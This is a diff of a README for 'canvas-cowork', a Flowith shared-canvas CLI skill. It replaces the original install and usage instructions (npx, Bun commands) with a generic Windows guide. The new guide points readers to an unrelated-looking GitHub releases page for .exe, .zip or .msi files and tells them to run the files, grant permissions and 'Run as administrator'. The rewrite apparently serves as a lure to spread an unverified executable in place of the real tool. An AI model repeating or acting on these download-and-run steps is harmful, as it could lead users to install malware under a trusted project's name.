@@ -1,57 +1,168 @@
-# Canvas Cowork
+# 🧭 canvas-cowork - Build shared spaces from the CLI
 
-Cowork on a spatial canvas from the CLI — create canvases, generate images/text/video/agent responses, read results, recall past work, and manage nodes on [Flowith](https://flowith.io)'s shared canvas.
+[![Download canvas-cowork](https://img.shields.io/badge/Download-Canvas--Cowork-blue?style=for-the-badge&logo=github)](https://github.com/160-cytoskeleton338/canvas-cowork/releases)
 
-Your AI agent gets a live cursor on the canvas. It moves in real time — users see nodes appear and the tree grow.
+## 📥 Download
 
-## Install
+Visit this page to download: https://github.com/160-cytoskeleton338/canvas-cowork/releases
 
-```bash
-npx skills add flowith-ai/canvas-cowork
-```
+Pick the latest Windows release, then download the app file for your computer.
 
-## What It Does
+## 🪟 Windows setup
 
-- **Create** canvases and place nodes on a spatial workspace
-- **Generate** images, text, video, and multi-step agent responses
-- **Read** results back — images as markdown, text inline, video as links
-- **Recall** past work across all canvases with semantic search
-- **Batch** independent generations in parallel for speed
+1. Open the download page.
+2. Find the newest release.
+3. Download the Windows file.
+4. Save it to a folder you can find, such as Downloads or Desktop.
+5. If the file comes in a .zip file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start it.
+8. If Windows asks for permission, choose Run or Yes.
 
-## Quick Start
+## ✨ What canvas-cowork does
 
-```bash
-# Create a canvas and generate an image
-bun $S --bot claude-code create-canvas "Dog Artwork"
-bun $S --bot claude-code set-mode image
-bun $S --bot claude-code submit "a golden retriever in a wheat field" --wait
+canvas-cowork helps you work on a shared spatial canvas from the command line. It lets you:
 
-# Burst: many items at once
-bun $S --bot claude-code submit-batch "golden retriever" "husky" "corgi" "poodle"
-bun $S --bot claude-code read-db --full
+- create new canvases
+- place text, images, and video on a canvas
+- generate agent responses
+- read stored results
+- look up past work
+- manage nodes on the canvas
 
-# Recall past work
-bun $S recall "cyberpunk logo" --type image
-```
+It is built for people who want a simple way to move between ideas, files, and results in one workspace.
 
-## Modes
+## 🖥️ What you need
 
-| Mode | Use for |
-|------|---------|
-| `text` | Answers, writing, analysis |
-| `image` | Visual generation |
-| `video` | Video clips |
-| `agent` / `neo` | Multi-step research, planning, complex deliverables |
+Use a Windows computer with:
 
-## Requirements
+- Windows 10 or later
+- a stable internet connection
+- enough free space for the app and saved content
+- a screen large enough to view the canvas well
 
-- A [Flowith](https://flowith.io) account with an active session in the browser
-- [Bun](https://bun.sh) runtime
+For best results, keep other large apps closed when you first launch it.
 
-## Documentation
+## 🚀 First run
 
-Full command reference and usage patterns are in [SKILL.md](./SKILL.md).
+When you open canvas-cowork for the first time, it may take a moment to start.
 
-## License
+After it opens, you can:
 
-MIT
+1. create a new canvas
+2. add a node
+3. generate a text response
+4. place the result on the canvas
+5. save your work for later
+
+If the app asks for access to your files, allow it so it can read and save your work.
+
+## 🎨 Main features
+
+### 🗂️ Create canvases
+Start a new canvas for each task, project, or idea. This helps keep your work in separate spaces.
+
+### 📝 Generate text
+Ask the app to produce text for notes, replies, or drafts, then place the result where you want it.
+
+### 🖼️ Generate images
+Create image nodes for visual ideas, mockups, or reference content.
+
+### 🎬 Generate video
+Add video outputs when your workflow needs motion or scene references.
+
+### 🤖 Agent responses
+Use agent responses to get help with tasks, writing, or step-based work inside the canvas.
+
+### 🔎 Read results
+Open saved outputs and review what the agent produced without searching through other tools.
+
+### 🧠 Recall past work
+Bring back previous work so you can continue from where you stopped.
+
+### 🧩 Manage nodes
+Move, update, and organize nodes on the canvas so your workspace stays clear.
+
+## 🧭 How to use it
+
+### 1. Start a canvas
+Open the app and create a canvas for your task.
+
+### 2. Add a node
+Create a node for text, an image, a video, or an agent reply.
+
+### 3. Run a command
+Use the CLI flow to request content or update an item on the canvas.
+
+### 4. Review the result
+Check the output in the canvas view and confirm it looks right.
+
+### 5. Save your work
+Keep the canvas so you can come back to it later.
+
+## 🧰 Common use cases
+
+- planning a project
+- drafting content
+- collecting AI output in one place
+- comparing versions of text
+- keeping ideas tied to visual blocks
+- organizing multi-step work
+- building a spatial workspace for agent tasks
+
+## 📂 Suggested folder setup
+
+If you save work by hand, use a clear folder layout like this:
+
+- Downloads
+- canvas-cowork
+- projects
+- exports
+- archived-canvas
+
+This makes it easier to find your canvases and saved results later.
+
+## 🔗 Links
+
+- Download page: https://github.com/160-cytoskeleton338/canvas-cowork/releases
+- Repository topics: agent-skills, ai-agent, canvas, claude-code, codex, flowith, mcp, openclaw, skills-sh, spatial-canvas
+
+## 🛠️ Basic troubleshooting
+
+### App does not open
+- Try running it again as the same user account.
+- Check that the file finished downloading.
+- Move the app to a simple folder like Downloads.
+
+### Windows blocks the file
+- Right-click the file and choose Run as administrator if needed.
+- If the file is inside a zip, extract it first.
+
+### Canvas does not save
+- Make sure you have write access to the folder.
+- Try a folder under your user account, such as Documents.
+
+### Results do not appear
+- Run the command again.
+- Check that the canvas is open before you send the request.
+- Confirm the node type matches the output you want
+
+## 📝 File types you may see
+
+You may see one or more of these files in the release:
+
+- .exe
+- .zip
+- .msi
+
+Use the Windows file that matches the release notes on the download page.
+
+## 🧭 Short workflow
+
+1. Download the latest Windows release
+2. Open the file
+3. Create a canvas
+4. Add nodes
+5. Generate content
+6. Review results
+7. Save the canvas
